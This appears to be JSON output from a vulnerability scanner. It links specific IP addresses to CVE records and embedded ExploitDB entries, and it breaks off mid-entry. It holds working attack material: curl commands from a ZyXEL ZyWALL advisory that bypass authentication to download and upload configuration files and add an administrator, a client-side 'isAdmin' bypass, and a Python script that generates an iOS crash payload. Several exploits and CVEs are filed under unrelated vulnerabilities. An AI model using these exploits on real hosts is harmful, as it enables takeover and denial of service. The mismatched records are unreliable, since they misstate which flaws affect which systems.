{
    "152.14.0.102": {
        "CVE-2010-1899": [
            {
                "source": "CVE",
                "_id": "2010-1899",
                "description": "Stack consumption vulnerability in the ASP implementation in Microsoft Internet Information Services (IIS) 5.1, 6.0, 7.0, and 7.5 allows remote attackers to cause a denial of service (daemon outage) via a crafted request, related to asp.dll, aka \"IIS Repeated Parameter Request Denial of Service Vulnerability.\"",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2010-1899"
                ],
                "msb": [
                    "MS10-065"
                ]
            }
        ],
        "CVE-2010-2730": [
            {
                "source": "CVE",
                "_id": "2010-2730",
                "description": "Buffer overflow in Microsoft Internet Information Services (IIS) 7.5, when FastCGI is enabled, allows remote attackers to execute arbitrary code via crafted headers in a request, aka \"Request Header Buffer Overflow Vulnerability.\"",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2010-2730"
                ],
                "msb": [
                    "MS10-065"
                ]
            },
            {
                "source": "CVE",
                "_id": "2014-2730",
                "description": "The XML parser in Microsoft Office 2007 SP3, 2010 SP1 and SP2, and 2013, and Office for Mac 2011, does not properly detect recursion during entity expansion, which allows remote attackers to cause a denial of service (memory consumption and persistent application hang) via a crafted XML document containing a large number of nested entity references, as demonstrated by a crafted text/plain e-mail message to Outlook, a similar issue to CVE-2003-1564.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-2730"
                ],
                "msb": []
            }
        ],
        "CVE-2010-3972": [
            {
                "source": "CVE",
                "_id": "2010-3972",
                "description": "Heap-based buffer overflow in the TELNET_STREAM_CONTEXT::OnSendData function in ftpsvc.dll in Microsoft FTP Service 7.0 and 7.5 for Internet Information Services (IIS) 7.0, and IIS 7.5, allows remote attackers to execute arbitrary code or cause a denial of service (daemon crash) via a crafted FTP command, aka \"IIS FTP Service Heap Buffer Overrun Vulnerability.\" NOTE: some of these details are obtained from third party information.",
                "osvdb": [],
                "bid": [
                    45542
                ],
                "cve": [
                    "CVE-2010-3972"
                ],
                "msb": [
                    "MS11-004"
                ]
            }
        ]
    },
    "152.14.0.106": {},
    "152.14.0.108": {
        "CVE-2010-1899": [
            {
                "source": "CVE",
                "_id": "2010-1899",
                "description": "Stack consumption vulnerability in the ASP implementation in Microsoft Internet Information Services (IIS) 5.1, 6.0, 7.0, and 7.5 allows remote attackers to cause a denial of service (daemon outage) via a crafted request, related to asp.dll, aka \"IIS Repeated Parameter Request Denial of Service Vulnerability.\"",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2010-1899"
                ],
                "msb": [
                    "MS10-065"
                ]
            }
        ],
        "CVE-2010-2730": [
            {
                "source": "CVE",
                "_id": "2010-2730",
                "description": "Buffer overflow in Microsoft Internet Information Services (IIS) 7.5, when FastCGI is enabled, allows remote attackers to execute arbitrary code via crafted headers in a request, aka \"Request Header Buffer Overflow Vulnerability.\"",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2010-2730"
                ],
                "msb": [
                    "MS10-065"
                ]
            },
            {
                "source": "CVE",
                "_id": "2014-2730",
                "description": "The XML parser in Microsoft Office 2007 SP3, 2010 SP1 and SP2, and 2013, and Office for Mac 2011, does not properly detect recursion during entity expansion, which allows remote attackers to cause a denial of service (memory consumption and persistent application hang) via a crafted XML document containing a large number of nested entity references, as demonstrated by a crafted text/plain e-mail message to Outlook, a similar issue to CVE-2003-1564.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-2730"
                ],
                "msb": []
            }
        ],
        "CVE-2010-3972": [
            {
                "source": "CVE",
                "_id": "2010-3972",
                "description": "Heap-based buffer overflow in the TELNET_STREAM_CONTEXT::OnSendData function in ftpsvc.dll in Microsoft FTP Service 7.0 and 7.5 for Internet Information Services (IIS) 7.0, and IIS 7.5, allows remote attackers to execute arbitrary code or cause a denial of service (daemon crash) via a crafted FTP command, aka \"IIS FTP Service Heap Buffer Overrun Vulnerability.\" NOTE: some of these details are obtained from third party information.",
                "osvdb": [],
                "bid": [
                    45542
                ],
                "cve": [
                    "CVE-2010-3972"
                ],
                "msb": [
                    "MS11-004"
                ]
            }
        ],
        "CVE-2012-2531": [
            {
                "source": "CVE",
                "_id": "2012-2531",
                "description": "Microsoft Internet Information Services (IIS) 7.5 uses weak permissions for the Operational log, which allows local users to discover credentials by reading this file, aka \"Password Disclosure Vulnerability.\"",
                "osvdb": [],
                "bid": [
                    56439
                ],
                "cve": [
                    "CVE-2012-2531"
                ],
                "msb": [
                    "MS12-073"
                ]
            }
        ],
        "CVE-2012-2532": [
            {
                "source": "CVE",
                "_id": "2012-2532",
                "description": "Microsoft FTP Service 7.0 and 7.5 for Internet Information Services (IIS) processes unspecified commands before TLS is enabled for a session, which allows remote attackers to obtain sensitive information by reading the replies to these commands, aka \"FTP Command Injection Vulnerability.\"",
                "osvdb": [],
                "bid": [
                    56440
                ],
                "cve": [
                    "CVE-2012-2532"
                ],
                "msb": [
                    "MS12-073"
                ]
            }
        ],
        "CVE-2010-1256": [
            {
                "source": "CVE",
                "_id": "2010-1256",
                "description": "Unspecified vulnerability in Microsoft IIS 6.0, 7.0, and 7.5, when Extended Protection for Authentication is enabled, allows remote authenticated users to execute arbitrary code via unknown vectors related to \"token checking\" that trigger memory corruption, aka \"IIS Authentication Memory Corruption Vulnerability.\"",
                "osvdb": [],
                "bid": [
                    40573
                ],
                "cve": [
                    "CVE-2010-1256"
                ],
                "msb": [
                    "MS10-040"
                ]
            },
            {
                "code": "Advisory: Authentication Bypass in Configuration Import and Export of\r\n          ZyXEL ZyWALL USG Appliances\r\n\r\nUnauthenticated users with access to the management web interface of\r\ncertain ZyXEL ZyWALL USG appliances can download and upload\r\nconfiguration files, that are applied automatically.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: ZyXEL USG (Unified Security Gateway) appliances\r\n         ZyWALL USG-20\r\n         ZyWALL USG-20W\r\n         ZyWALL USG-50\r\n         ZyWALL USG-100\r\n         ZyWALL USG-200\r\n         ZyWALL USG-300\r\n         ZyWALL USG-1000\r\n         ZyWALL USG-1050\r\n         ZyWALL USG-2000\r\n         Possibly other ZLD-based products\r\nAffected Versions: Firmware Releases before April 25, 2011\r\nFixed Versions: Firmware Releases from or after April 25, 2011\r\nVulnerability Type: Authentication Bypass\r\nSecurity Risk: high\r\nVendor URL: http://www.zyxel.com/\r\nVendor Status: fixed version released\r\nAdvisory URL: http://www.redteam-pentesting.de/advisories/rt-sa-2011-003\r\nAdvisory Status: published\r\nCVE: GENERIC-MAP-NOMATCH\r\nCVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH\r\n\r\n\r\nIntroduction\r\n============\r\n\r\n``The ZyWALL USG (Unified Security Gateway) Series is the \"third\r\ngeneration\" ZyWALL featuring an all-new platform. It provides greater\r\nperformance protection, as well as a deep packet inspection security\r\nsolution for small businesses to enterprises alike. It embodies a\r\nStateful Packet Inspection (SPI) firewall, Anti-Virus, Intrusion\r\nDetection and Prevention (IDP), Content Filtering, Anti-Spam, and VPN\r\n(IPSec/SSL/L2TP) in one box. This multilayered security safeguards your\r\norganization's customer and company records, intellectual property, and\r\ncritical resources from external and internal threats.''\r\n\r\n(From the vendor's homepage)\r\n\r\n\r\nMore Details\r\n============\r\n\r\nDuring a penetration test, a ZyXEL ZyWALL USG appliance was found and\r\ntested for security vulnerabilities.  The following sections first\r\ndescribe, how the appliance's filesystem can be extracted from the\r\nencrypted firmware upgrade zip files.  Afterwards it is shown, how\r\narbitrary configuration files can be up- and downloaded from the\r\nappliance.  This way, a custom user account with a chosen password can\r\nbe added to the running appliance without the need of a reboot.\r\n\r\n\r\nDecrypting the ZyWALL Firmware Upgrade Files\r\n--------------------------------------------\r\n\r\nFirmware upgrade files for ZyXEL ZyWALL USG appliances consist of a\r\nregularly compressed zip file, which contains, among others, two\r\nencrypted zip files with the main firmware.  For example, the current\r\nfirmware version 2.21(BQD.2) for the ZyWALL USG 20 (\"ZyWALL USG\r\n20_2.21(BDQ.2)C0.zip\") contains the following files:\r\n\r\n  -rw-r--r-- 1 user user 43116374 Sep 30  2010 221BDQ2C0.bin\r\n  -rw-r--r-- 1 user user     7354 Sep 30  2010 221BDQ2C0.conf\r\n  -rw-r--r-- 1 user user    28395 Sep 30  2010 221BDQ2C0.db\r\n  -rw-r--r-- 1 user user   703402 Oct 12 17:48 221BDQ2C0.pdf\r\n  -rw-r--r-- 1 user user  3441664 Sep 30  2010 221BDQ2C0.ri\r\n  -rw-r--r-- 1 user user      231 Sep 30  2010 firmware.xml\r\n\r\nThe files 221BDQ2C0.bin and 221BDQ2C0.db are encrypted zip files that\r\nrequire a password for decompression.  Listing the contents is\r\npossible:\r\n\r\n  $ unzip -l 221BDQ2C0.bin\r\n  Archive:  221BDQ2C0.bin\r\n    Length      Date    Time    Name\r\n  ---------  ---------- -----   ----\r\n   40075264  2010-09-15 06:32   compress.img\r\n          0  2010-09-30 04:48   db/\r\n          0  2010-09-30 04:48   db/etc/\r\n          0  2010-09-30 04:48   db/etc/zyxel/\r\n          0  2010-09-30 04:48   db/etc/zyxel/ftp/\r\n          0  2010-09-30 04:48   db/etc/zyxel/ftp/conf/\r\n         20  2010-09-14 14:46   db/etc/zyxel/ftp/conf/htm-default.conf\r\n       7354  2010-09-14 14:46   db/etc/zyxel/ftp/conf/system-default.conf\r\n          0  2010-09-30 04:48   etc_writable/\r\n          0  2010-09-30 04:48   etc_writable/budget/\r\n          0  2010-09-14 15:08   etc_writable/budget/budget.conf\r\n          0  2010-09-15 06:28   etc_writable/firmware-upgraded\r\n         81  2010-09-14 15:09   etc_writable/myzyxel_info.conf\r\n        243  2010-09-14 15:03   etc_writable/tr069ta.conf\r\n          0  2010-09-30 04:48   etc_writable/zyxel/\r\n          0  2010-09-30 04:48   etc_writable/zyxel/conf/\r\n        996  2010-09-15 06:28   etc_writable/zyxel/conf/__eps_checking_default.xml\r\n      42697  2010-09-14 14:46   etc_writable/zyxel/conf/__system_default.xml\r\n         95  2010-09-30 04:48   filechecksum\r\n       1023  2010-09-30 04:48   filelist\r\n        336  2010-09-30 04:48   fwversion\r\n         50  2010-09-15 06:34   kernelchecksum\r\n    3441664  2010-09-30 04:48   kernelusg20.bin\r\n          0  2010-09-14 14:46   wtp_image/\r\n  ---------                     -------\r\n   43569823                     24 files\r\n\r\n  $ unzip -l 221BDQ2C0.db\r\n  Archive:  221BDQ2C0.db\r\n    Length      Date    Time    Name\r\n  ---------  ---------- -----   ----\r\n          0  2009-07-29 04:44   db_remove_lst\r\n          0  2010-09-15 06:28   etc/\r\n          0  2010-09-15 06:35   etc/idp/\r\n         39  2010-09-14 16:08   etc/idp/all.conf\r\n         25  2010-09-14 16:08   etc/idp/attributes.txt\r\n        639  2010-09-14 16:08   etc/idp/attributes_self.txt\r\n        277  2010-09-14 16:08   etc/idp/device.conf\r\n         39  2010-09-14 16:08   etc/idp/dmz.conf\r\n         39  2010-09-14 16:08   etc/idp/lan.conf\r\n         39  2010-09-14 16:08   etc/idp/none.conf\r\n      60581  2010-09-14 16:08   etc/idp/self.ref\r\n       5190  2010-09-14 16:08   etc/idp/self.rules\r\n          0  2010-09-14 16:08   etc/idp/update.ref\r\n          0  2010-09-14 16:08   etc/idp/update.rules\r\n         39  2010-09-14 16:08   etc/idp/wan.conf\r\n     445075  2010-09-14 16:08   etc/idp/zyxel.ref\r\n        327  2010-09-14 16:08   etc/idp/zyxel.rules\r\n          0  2010-09-14 16:05   etc/zyxel/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/.dha/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/.dha/dha_idp/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/cert/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/cert/trusted/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/conf/\r\n         20  2010-09-14 14:46   etc/zyxel/ftp/conf/htm-default.conf\r\n       7354  2010-09-14 14:46   etc/zyxel/ftp/conf/system-default.conf\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/dev/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/idp/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/packet_trace/\r\n          0  2010-09-15 06:35   etc/zyxel/ftp/script/\r\n       1256  2010-09-15 06:35   filelist\r\n  ---------                     -------\r\n     520939                     31 files\r\n\r\nDuring a penetration test it was discovered that the file\r\n\"221BDQ2C0.conf\" (from the unencrypted firmware zip file) has exactly\r\nthe same size as the file \"system-default.conf\" contained in each\r\nencrypted zip.  This can be successfully used for a known-plaintext\r\nattack[1] against these files, afterwards the decrypted zip-files can be\r\nextracted.  However, please note that this attack only allows decrypting\r\nthe encrypted zip files, the password used for encrypting the files in\r\nthe first place is not revealed.\r\n\r\nAmong others, the following programs implement this attack:\r\n\r\n * PkCrack by Peter Conrad [2]\r\n * Elcomsoft Advanced Archive Password Recovery [3]\r\n\r\nAfterwards, the file \"compress.img\" from \"221BDQ2C0.bin\" can be\r\ndecompressed (e.g. by using the program \"unsquashfs\"), revealing the\r\nfilesystem for the appliance.\r\n\r\n\r\nWeb-Interface Authentication Bypass\r\n-----------------------------------\r\n\r\nZyWALL USG appliances can be managed over a web-based administrative\r\ninterface offered by an Apache http server.  The interface requires\r\nauthentication prior to any actions, only some static files can be\r\nrequested without authentication.\r\n\r\nA custom Apache module \"mod_auth_zyxel.so\" implements the\r\nauthentication, it is configured in etc/service_conf/httpd.conf in the\r\nfirmware (see above). Several Patterns are configured with the directive\r\n\"AuthZyxelSkipPattern\", all URLs matching one of these patterns can be\r\naccessed without authentication:\r\n\r\n  AuthZyxelSkipPattern /images/ /weblogin.cgi /I18N.js /language\r\n\r\nThe administrative interface consists of several programs which are\r\ncalled as CGI scripts. For example, accessing the following URL after\r\nlogging in with an admin account delivers the current startup\r\nconfiguration file:\r\n\r\n  https://192.168.0.1/cgi-bin/export-cgi?category=config&arg0=startup-config.conf\r\n\r\nThe Apache httpd in the standard configuration allows appending\r\narbitrary paths to CGI scripts. The server saves the extra path in the\r\nenvironment variable PATH_INFO and executes the CGI script (this can be\r\ndisabled by setting \"AcceptPathInfo\" to \"off\"[4]). Therefore, appending\r\nthe string \"/images/\" and requesting the following URL also executes the\r\n\"export-cgi\" script and outputs the current configuration file:\r\n\r\n  https://192.168.0.1/cgi-bin/export-cgi/images/?category=config&arg0=startup-config.conf\r\n\r\nDuring the penetration test it was discovered that for this URL, no\r\nauthentication is necessary (because the string \"/images/\" is included\r\nin the path-part of the URL) and arbitrary configuration files can be\r\ndownloaded. The file \"startup-config.conf\" can contain sensitive data\r\nlike firewall rules and hashes of user passwords. Other interesting\r\nconfig-file names are \"lastgood.conf\" and \"systemdefault.conf\".\r\n\r\nThe administrative interface furthermore allows uploading of\r\nconfiguration files with the \"file_upload-cgi\" script.  Applying the\r\nsame trick (appending \"/images/\"), arbitrary configuration files can be\r\nuploaded without any authentication.  When the chosen config-file name\r\nis set to \"startup-config.conf\", the appliance furthermore applies all\r\nsettings directly after uploading.  This can be used to add a second\r\nadministrative user with a self-chosen password and take over the\r\nappliance.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe current startup-config.conf file from a ZyWALL USG appliance can be\r\ndownloaded by accessing the following URL, e.g. with the program cURL:\r\n\r\n $ curl --silent -o startup-config.conf \\\r\n   \"https://192.168.0.1/cgi-bin/export-cgi/images/?category=config&arg0=startup-config.conf\"\r\n\r\nThis file can be re-uploaded (e.g. after adding another administrative\r\nuser) with the following command, the parameter \"ext-comp-1121\" may need\r\nto be adjusted:\r\n\r\n $ curl --silent -F ext-comp-1121=50 -F file_type=config -F nv=1 \\\r\n   -F \"file_path=@startup-config.conf;filename=startup-config.conf\" \\\r\n   https://192.168.0.1/cgi-bin/file_upload-cgi/images/\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nIf possible, disable the web-based administrative interface or else\r\nensure that the interface is not exposed to attackers.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpgrade to a firmware released on or after April 25, 2011.\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nAny attackers who are able to access the administrative interface of\r\nvulnerable ZyWALL USG appliances can read and write arbitrary configuration\r\nfiles, thus compromising the complete appliance.  Therefore the risk is\r\nestimated as high.\r\n\r\n\r\nHistory\r\n=======\r\n\r\n2011-03-07 Vulnerability identified\r\n2011-04-06 Customer approved disclosure to vendor\r\n2011-04-07 Vendor notified\r\n2011-04-07 First reactions of vendor, issue is being investigated\r\n2011-04-08 Meeting with vendor\r\n2011-04-15 Vulnerability fixed by vendor\r\n2011-04-18 Test appliance and beta firmware supplied to\r\n           RedTeam Pentesting, fix verified\r\n2011-04-25 Vendor released new firmwares with fix\r\n2011-04-29 Vendor confirms that other ZLD-based devices may also be\r\n           affected\r\n2011-05-04 Advisory released\r\n\r\nRedTeam Pentesting likes to thank ZyXEL for the fast response and\r\nprofessional collaboration.\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] ftp://utopia.hacktic.nl/pub/crypto/cracking/pkzip.ps.gz\r\n[2] http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html\r\n[3] http://www.elcomsoft.com/archpr.html\r\n[4] http://httpd.apache.org/docs/2.0/mod/core.html#acceptpathinfo\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests, short pentests,\r\nperformed by a team of specialised IT-security experts. Hereby, security\r\nweaknesses in company networks or products are uncovered and can be\r\nfixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at\r\nhttp://www.redteam-pentesting.de.\r\n\r\n\r\n-- \r\nRedTeam Pentesting GmbH                    Tel.: +49 241 963-1300\r\nDennewartstr. 25-27                        Fax : +49 241 963-1304\r\n52068 Aachen                    http://www.redteam-pentesting.de/\r\nGermany                         Registergericht: Aachen HRB 14004\r\nGesch\u00e4ftsf\u00fchrer: Patrick Hof, Jens Liebchen, Claus R. F. Overbeck\r\n\r\n\r\nAdvisory: Client Side Authorization ZyXEL ZyWALL USG Appliances Web\r\n          Interface\r\n\r\nThe ZyXEL ZyWALL USG appliances perform parts of the authorization for\r\ntheir management web interface on the client side using JavaScript. By\r\nsetting the JavaScript variable \"isAdmin\" to \"true\", a user with limited\r\naccess gets full access to the web interface.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: ZyXEL USG (Unified Security Gateway) appliances\r\n         ZyWALL USG-20\r\n         ZyWALL USG-20W\r\n         ZyWALL USG-50\r\n         ZyWALL USG-100\r\n         ZyWALL USG-200\r\n         ZyWALL USG-300\r\n         ZyWALL USG-1000\r\n         ZyWALL USG-1050\r\n         ZyWALL USG-2000\r\n         Possibly other ZLD-based products\r\nAffected Versions: Firmware Releases before April 25, 2011\r\nFixed Versions: Firmware  Releases from or after April 25, 2011\r\nVulnerability Type: Client Side Authorization\r\nSecurity Risk: medium\r\nVendor URL: http://www.zyxel.com/\r\nVendor Status: fixed version released\r\nAdvisory URL: http://www.redteam-pentesting.de/advisories/rt-sa-2011-004\r\nAdvisory Status: published\r\nCVE: GENERIC-MAP-NOMATCH\r\nCVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH\r\n\r\n\r\nIntroduction\r\n============\r\n\r\n``The ZyWALL USG (Unified Security Gateway) Series is the \"third\r\ngeneration\" ZyWALL featuring an all-new platform. It provides greater\r\nperformance protection, as well as a deep packet inspection security\r\nsolution for small businesses to enterprises alike. It embodies a\r\nStateful Packet Inspection (SPI) firewall, Anti-Virus, Intrusion\r\nDetection and Prevention (IDP), Content Filtering, Anti-Spam, and VPN\r\n(IPSec/SSL/L2TP) in one box. This multilayered security safeguards your\r\norganization's customer and company records, intellectual property, and\r\ncritical resources from external and internal threats.''\r\n\r\n(From the vendor's homepage)\r\n\r\n\r\nMore Details\r\n============\r\n\r\nUsers with the role \"limited-admin\" are allowed to log into the\r\nweb-based administrative interface and configure some aspects of a\r\nZyWALL USG appliance.  It is usually not possible to download the current\r\nconfiguration file, as this includes the password-hashes of all users.\r\nWhen the \"download\" button in the File Manager part of the web interface\r\nis pressed, a JavaScript dialogue window informs the user that this\r\noperation is not allowed.  However, setting the JavaScript variable\r\n\"isAdmin\" to \"true\" (e.g. by using the JavaScript console of the\r\n\"Firebug\" extension for the Firefox web browser) disables this check and\r\nlets the user download the desired configuration file.  It is also\r\npossible to directly open the URL that downloads the configuration file.\r\nThe appliances do not check the users' permissions on the server side.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nAfter logging into the web interface, set the local JavaScript variable\r\n\"isAdmin\" to \"true\" and use the File Manager to download configuration\r\nfiles.  Alternatively, the current configuration file (including the\r\npassword hashes) can also be downloaded directly by accessing the\r\nfollowing URL:\r\n\r\n  https://192.168.0.1/cgi-bin/export-cgi?category=config&arg0=startup-config.conf\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nIf possible, disable the web-based administrative interface or ensure\r\notherwise that the interface is not exposed to attackers.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpgrade to a firmware released on or after April 25, 2011.\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nThis vulnerability enables users of the role \"limited-admin\" to access\r\nconfiguration files with potentially sensitive information (like the\r\npassword hashes of all other users).  The risk of this vulnerability is\r\nestimated as medium.\r\n\r\n\r\nHistory\r\n=======\r\n\r\n2011-03-07 Vulnerability identified\r\n2011-04-06 Customer approved disclosure to vendor\r\n2011-04-07 Vendor notified\r\n2011-04-08 Meeting with vendor\r\n2011-04-15 Vulnerability fixed by vendor\r\n2011-04-18 Test appliance and beta firmware supplied to\r\n           RedTeam Pentesting, fix verified\r\n2011-04-25 Vendor released new firmwares with fix\r\n2011-04-29 Vendor confirms that other ZLD-based devices may also be\r\n           affected\r\n2011-05-04 Advisory released\r\n\r\nRedTeam Pentesting likes to thank ZyXEL for the fast response and\r\nprofessional collaboration.\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests, short pentests,\r\nperformed by a team of specialised IT-security experts. Hereby, security\r\nweaknesses in company networks or products are uncovered and can be\r\nfixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at\r\nhttp://www.redteam-pentesting.de.\r\n\r\n-- \r\nRedTeam Pentesting GmbH                    Tel.: +49 241 963-1300\r\nDennewartstr. 25-27                        Fax : +49 241 963-1304\r\n52068 Aachen                    http://www.redteam-pentesting.de/\r\nGermany                         Registergericht: Aachen HRB 14004\r\nGesch\u00e4ftsf\u00fchrer: Patrick Hof, Jens Liebchen, Claus R. F. Overbeck",
                "description": "ZyWALL USG Appliance - Multiple Vulnerabilities",
                "author": "RedTeam Pentesting",
                "_id": 17244,
                "source": "ExploitDB",
                "platform": "hardware",
                "date": "2011-05-04T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            }
        ]
    },
    "152.14.0.113": {
        "CVE-2010-2068": [
            {
                "source": "CVE",
                "_id": "2010-2791",
                "description": "mod_proxy in httpd in Apache HTTP Server 2.2.9, when running on Unix, does not close the backend connection if a timeout occurs when reading a response from a persistent connection, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.  NOTE: this is the same issue as CVE-2010-2068, but for a different OS and set of affected versions.",
                "osvdb": [],
                "bid": [
                    42102
                ],
                "cve": [
                    "CVE-2010-2791"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2010-2068",
                "description": "mod_proxy_http.c in mod_proxy_http in the Apache HTTP Server 2.2.9 through 2.2.15, 2.3.4-alpha, and 2.3.5-alpha on Windows, NetWare, and OS/2, in certain configurations involving proxy worker pools, does not properly detect timeouts, which allows remote attackers to obtain a potentially sensitive response intended for a different client in opportunistic circumstances via a normal HTTP request.",
                "osvdb": [],
                "bid": [
                    40827
                ],
                "cve": [
                    "CVE-2010-2068"
                ],
                "msb": []
            }
        ],
        "CVE-2010-0408": [
            {
                "source": "CVE",
                "_id": "2010-0408",
                "description": "The ap_proxy_ajp_request function in mod_proxy_ajp.c in mod_proxy_ajp in the Apache HTTP Server 2.2.x before 2.2.15 does not properly handle certain situations in which a client sends no request body, which allows remote attackers to cause a denial of service (backend server outage) via a crafted request, related to use of a 500 error code instead of the appropriate 400 error code.",
                "osvdb": [],
                "bid": [
                    38491
                ],
                "cve": [
                    "CVE-2010-0408"
                ],
                "msb": []
            }
        ],
        "CVE-2017-7679": [
            {
                "source": "CVE",
                "_id": "2017-7679",
                "description": "In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime can read one byte past the end of a buffer when sending a malicious Content-Type response header.",
                "osvdb": [],
                "bid": [
                    99170
                ],
                "cve": [
                    "CVE-2017-7679"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: TpwnT - iOS Denail of Service POC\r\n# Date: 10-31-2017\r\n# Exploit Author: Russian Otter (Ro)\r\n# Vendor Homepage: https://support.apple.com/en-us/HT208222\r\n# Version: 2.1\r\n# Tested on: iOS 10.3.2 - 11.1\r\n# CVE: CVE-2017-13849\r\n\r\n\"\"\"\r\n-------------------------\r\n     CVE-2017-13849\r\n  TpwnT by Ro of SavSec\r\n-------------------------\r\n\r\nDescription:\r\n\tThread Pwning Text (TpwnT) is maliciously crafted text that affects the iPhone and other Apple devices by exploiting a vulnerability found in the Core-Text firmware which results in a thread crash or extreme application lag!\r\n\r\nRecorded Tests / Results:\r\n\tSignal version 2.14.1 on iOS 10.3.2 (fixed on 2.15.3) users were able to crash conversations by sending the payload which would result in the app crashing when the selected chat was opened.\r\n\t\r\n\tInstagram version 10.25 (fixed on 10.31) on iOS 10.3.2 and resulting in chat thread crashes when the payload was sent which disallowed users to load chat or send messages. When the payload was unsent the chat was fuctional.\r\n\t\r\n\tPythonista 3 on iOS 10.3.2, crashed when displaying multiple sets of TpwnT or while rotating the device.\r\n\t\r\nSummary:\r\n\tWhen displaying the TpwnT Characters on iOS < 11.1 the iPhone may lag intensely or crash on certain apps!\r\n\tThis allows for the possibility of DoS related attacks or application crashing attacks.\r\n\r\nCreator: @Russian_Otter (Ro)\r\nDiscovery: 7-17-2017\r\nDisclosure: 10-31-2017\r\nDisclosure Page: https://support.apple.com/en-us/HT208222\r\n\r\nAffected Devices\r\n\tiPhone 5S iOS < 11.1\r\n\tiPhone 6 & 6S iOS < 11.1\r\n\tiPhone 7 iOS < 11.1\r\n\tiPhone 8 iOS < 11.1\r\n\tiPhone X iOS < 11.1\r\n\tApple TV 4th Generation\r\n\tApple TV 4K 4th Generation\r\n\tiPod Touch 6th Generation\r\n\tiPad Air\r\n\twatchOS < 4.1\r\n\ttvOS < 11.1\r\n\tiOS < 11.1\r\n\r\nTested Devices:\r\n\tiPhone 5S iOS 10.3.2 - 11.1\r\n\tiPhone 6S iOS 10.3.1 - 11.1\r\n\tiPad Mini 2 iOS 10.3.2\r\n\tApple TV 2 tvOS 10\r\n\r\nTested Apps:\r\n\tSignal\r\n\tInstagram\r\n\tSnapchat\r\n\tSafari\r\n\tTanktastic\r\n\tPythonista 3\r\n\tNotepad\r\n\r\n\"\"\"\r\n\r\ntpwnt = \"880 881 883 887 888 975 1159 1275 1276 1277 1278 1302 1304 1305 1306 1311 1313 1314 1316 1317 1318 1319 1322 1323 1324 1325 1326 1327 1328 1543 2304 2405 3073 3559 3585 3586 4091 4183 4184 4353 6366 6798 7679 7680 7837 7930 7932 7933 7934 7935 7936 8343 8344 8345 8346 8347 8348 8349 8376 8381 8382 8383 8384 8524 9136 9169 10215 10216 11153 11374 11377 11381 11390 11392 11746 11747 11748 11749 11750 11751 11752 11753 11754 11755 11756 11757 11758 11759 11760 11761 11762 11763 11764 11765 11766 11767 11768 11769 11771 11772 11773 11774 11775 11776 11811 11813 11814 12295 12344 12357 12686 19971 19975 42560 42562 42563 42564 42565 42566 42567 42568 42569 42570 42571 42572 42573 42574 42575 42576 42577 42578 42579 42580 42581 42583 42584 42585 42587 42588 42589 42590 42591 42592 42594 42595 42596 42597 42598 42599 42600 42601 42602 42603 42604 42605 42606 42608 42609 42610 42611 42612 42613 42614 42615 42616 42617 42619 42620 42621 42622 42623 42624 42625 42627 42628 42629 42630 42632 42633 42634\".split()\r\n\r\npayload = \"\"\r\nfor i in tpwnt:\r\n\ts = unichr(int(i))\r\n\tpayload += s\r\n\r\npayload = bytes(payload)\r\npayload_unicode = unicode(payload)\r\n\r\n# Proof of Concept\r\n# iOS < 11.1 Devices that display these characters should experience lag or crashes while TpwnT is visible\r\n\r\nif raw_input(\"Show Payload [y/n] \") == \"y\":\r\n\tprint payload_unicode",
                "description": "iOS < 11.1 / tvOS < 11.1 / watchOS < 4.1 - Denial of Service",
                "author": "Russian Otter",
                "_id": 43161,
                "source": "ExploitDB",
                "platform": "ios",
                "date": "2017-11-20T00:00:00+00:00",
                "cve": [
                    "CVE-2017-13849"
                ],
                "type": "dos",
                "port": 0
            }
        ],
        "CVE-2010-0425": [
            {
                "source": "CVE",
                "_id": "2010-0425",
